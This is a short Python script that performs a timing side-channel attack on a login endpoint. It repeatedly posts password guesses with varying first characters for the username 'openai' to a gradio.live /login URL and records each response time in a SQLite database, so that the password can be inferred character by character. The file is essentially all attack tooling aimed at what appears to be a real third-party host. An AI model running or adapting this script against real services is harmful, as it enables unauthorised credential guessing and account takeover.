import sys
import getopt
import time
import requests
import sqlite3
import argparse

def main():
    out_file = None

    parser = argparse.ArgumentParser(prog='measure', description='Record execution time of a lit of requests.', epilog='Use analyze program to watch program vulnerabilities')

    parser.add_argument('-c', action='append')
    parser.add_argument('-r')
    parser.add_argument('data_base')
    args = parser.parse_args()

    characters = args.c
    repeats = int(args.r, 10)


    with sqlite3.connect(args.data_base) as conn:
        db = conn.cursor()

        for c in characters:
            db.execute("DROP TABLE IF EXISTS REQUEST ;")
            db.execute("CREATE TABLE REQUEST (ID INTEGER PRIMARY KEY AUTOINCREMENT, INPUT CHAR(1), TIME_TAKEN TIMESTAMP) ;")

        session = requests.Session()

        for i in range(repeats):
            print("pass {0}/{1} executed".format(i, repeats))
            for c in characters:
                data = {
                    'username': 'openai',
                    'password': '{0}AAAAAAA'.format(c) #isCloseAi
                }

                print("requesting")
                time_start = time.monotonic_ns()
                try:
                    r = session.post("https://44fd86288430d3b355.gradio.live/login", data)
                except:
                    print("unreachable network")
                    pass
                diff = time.monotonic_ns() - time_start

                print("saving")
                db.execute("INSERT INTO REQUEST (INPUT, TIME_TAKEN) VALUES(?, ?)", (c, diff))
                conn.commit()

                print("{0}".format(c))
        db.close()
        
if __name__ == "__main__":
    main()

